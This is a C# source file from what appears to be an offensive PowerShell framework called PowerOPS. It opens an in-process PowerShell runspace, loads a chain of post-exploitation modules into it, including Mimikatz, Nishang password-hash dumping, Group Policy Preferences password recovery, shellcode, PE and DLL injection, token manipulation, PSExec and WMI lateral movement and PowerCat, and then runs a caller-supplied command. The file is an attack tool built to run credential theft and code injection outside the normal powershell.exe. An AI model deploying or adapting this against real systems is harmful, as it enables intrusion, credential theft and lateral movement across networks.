using System;
using System.IO;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;

namespace PowerOPS
{
    class PowerShellExecutor
    {
        public void ExecuteSynchronously(string PSfunction)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(PowerOPS.PowerView());
            pipeline.Commands.AddScript(PowerOPS.PowerUp());
            pipeline.Commands.AddScript(PowerOPS.Nishang_GetInformation());
            pipeline.Commands.AddScript(PowerOPS.AutoGPP());
            pipeline.Commands.AddScript(PowerOPS.Nishang_GetPassHashes());
            pipeline.Commands.AddScript(PowerOPS.Nishang_PortScan());
            pipeline.Commands.AddScript(PowerOPS.Mimikatz());
            pipeline.Commands.AddScript(PowerOPS.InvokeShellcode());
            pipeline.Commands.AddScript(PowerOPS.InvokePEInjection());
            pipeline.Commands.AddScript(PowerOPS.InvokeDLLInjection());
            pipeline.Commands.AddScript(PowerOPS.InvokeNinjaCopy());
            pipeline.Commands.AddScript(PowerOPS.TokenManipulation());
            pipeline.Commands.AddScript(PowerOPS.InvokeWMI());
            pipeline.Commands.AddScript(PowerOPS.InvokePSExec());
            pipeline.Commands.AddScript(PowerOPS.PowerCat());
            pipeline.Commands.AddScript(PSfunction);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.AppendLine(obj.ToString());
            }

            Console.Write(stringBuilder.ToString());
        }
    }
}
